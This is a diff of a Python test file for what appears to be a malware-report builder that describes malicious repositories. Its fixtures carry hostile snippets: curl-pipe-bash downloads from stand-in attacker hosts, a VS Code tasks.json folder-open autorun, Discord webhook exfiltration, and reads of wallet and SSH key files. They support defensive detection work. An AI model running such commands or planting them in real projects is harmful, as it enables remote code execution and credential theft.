@@ -456,8 +456,45 @@ def test_minecraft_stealer_report_describes_account_theft():
     assert "private keys and cloud" not in r["threat_description"]
     assert "minecraft-account-stealer" in r["tags"]
     assert "https://discord.com/api/webhooks/123/abc" in r["verified_iocs"]
-    assert "credential_access/mc-launcher-accounts (1 file)" in r["payload_description"]
-    assert "network_exfil/discord-webhook (1 file)" in r["payload_description"]
+    # Names the malware class and the exfil channel with its exact line.
+    td = r["threat_description"]
+    assert td.startswith("Infostealer targeting Minecraft accounts, exfiltrating to a "
+                         "Discord webhook (src/main/java/me/x/Grabber.java:52)")
+    pd = r["payload_description"]
+    assert pd.startswith("Malicious payload found in: src/main/java/me/x/Grabber.java")
+    assert "- src/main/java/me/x/Grabber.java:40: reads Minecraft launcher account" in pd
+    assert "- src/main/java/me/x/Grabber.java:52: hardcoded Discord webhook" in pd
+
+
+def test_report_is_short_and_leads_with_the_payload():
+    # OSM maintainer feedback (2026-10-07): the VS Code tasks.json payload was lost
+    # in a wall of prose. The report leads with what and where, in a few lines.
+    r = build_report(_row(raw_payload=json.dumps({"bash_findings": [
+        {"file": ".vscode/tasks.json", "line": 5, "category": "install_hook",
+         "rule": "vscode-autorun",
+         "snippet": '"runOn": "folderOpen" curl https://x-c2.vercel.app/a | bash '
+                    '"reveal": "never"'}]})),
+        campaign_ctx="Campaign GW-C-1: one of 81 confirmed repos across 69 accounts.")
+    td, pd = r["threat_description"], r["payload_description"]
+    assert td.startswith("VS Code autorun dropper. Payload in .vscode/tasks.json.")
+    assert pd.splitlines()[0] == "Malicious payload found in: .vscode/tasks.json"
+    assert "terminal hidden (reveal: never)" in pd
+    assert "- Attacker hosts: x-c2.vercel.app" in pd
+    assert "Campaign GW-C-1" in td
+    assert len(td) < 900 and len(pd) < 600
+
+
+def test_crypto_wallet_theft_is_named_only_when_the_evidence_shows_it():
+    def report(snippet):
+        return build_report(_row(raw_payload=json.dumps({"bash_findings": [
+            {"file": "a2.py", "line": 10, "category": "credential_access",
+             "rule": "keyfiles", "snippet": snippet},
+            {"file": "a2.py", "line": 27, "category": "network_exfil",
+             "rule": "discord-webhook",
+             "snippet": "https://discord.com/api/webhooks/1/x"}]})))["threat_description"]
+    assert report("open(os.path.join(home, 'Exodus', 'exodus.wallet'))").startswith(
+        "Infostealer and cryptostealer, exfiltrating to a Discord webhook (a2.py:27)")
+    assert "wallet" not in report("open(home + '/.ssh/id_rsa')")
 
 
 def test_report_names_the_signature_that_found_the_repo():
@@ -481,3 +518,27 @@ def test_report_prose_never_carries_em_dashes():
     assert _no_dashes("Lazarus \u2014 per OSM") == "Lazarus, per OSM"
     assert _no_dashes("a\u2014b -- c") == "a, b, c"
     assert _no_dashes("pages 1\u20133") == "pages 1-3"
+
+
+def test_report_prose_skips_incidental_hits_after_the_confirming_ones():
+    # A forked repo carries ordinary scripts that trip weak rules; the report
+    # describes only what confirmed it (confirming findings are stored first).
+    bash = [
+        {"file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
+         "rule": "vscode-autorun", "snippet": "curl https://c2.vercel.app/a | bash"},
+        {"file": "Makefile", "line": 137, "category": "persistence", "rule": "rc-files",
+         "snippet": "echo alias >> ~/.bashrc"}]
+    for payload in ({"bash_findings": bash, "confirming_count": 1},
+                    {"bash_findings": bash}):  # older finding: no count stored
+        r = build_report(_row(raw_payload=json.dumps(payload)))
+        assert "Makefile" not in r["threat_description"] + r["payload_description"]
+        assert "Makefile#L137" in r["evidence_references"]  # still linked as evidence
+
+
+def test_report_prose_drops_shared_services_and_truncated_hosts():
+    from git_warden.osm_submit import _prose_hosts
+    bash = [{"category": "download_exec", "rule": "curl-pipe-shell",
+             "snippet": "curl https://evil.vercel.app/a | bash; curl https://evil.vercel.ap"},
+            {"category": "network_exfil", "rule": "discord-webhook",
+             "snippet": "https://discord.com/api/webhooks/1/x"}]
+    assert _prose_hosts(bash) == ["evil.vercel.app"]
